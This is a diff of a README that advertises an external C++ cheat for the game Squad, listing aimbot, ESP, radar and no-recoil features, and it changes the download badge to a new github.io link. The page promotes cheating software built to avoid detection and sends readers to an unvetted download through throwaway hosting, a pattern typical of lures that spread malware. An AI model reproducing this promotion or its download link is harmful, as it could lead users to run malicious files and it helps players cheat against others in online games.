@@ -2,7 +2,7 @@
 
 Command the battlefield in **Squad** with this powerful, fully external **C++ cheat**, developed for realism-focused players who want precision tools without drawing attention. Whether you're in a 100-player firefight or silent recon, this cheat gives you smart features like aimbot, ESP, radar overlay, no recoil, and full bone targeting — all customizable in real time. 🛡️ Designed for safety and tactical superiority.
 
-[![Download Squad Cheat](https://img.shields.io/badge/Download-Squad_Cheat-blueviolet)](https://fileoffload11.bitbucket.io)
+[![Download Squad Cheat](https://img.shields.io/badge/Download-Squad_Cheat-blueviolet)](https://Squad-Cheat-gob3.github.io/.github)
 
 ---
 
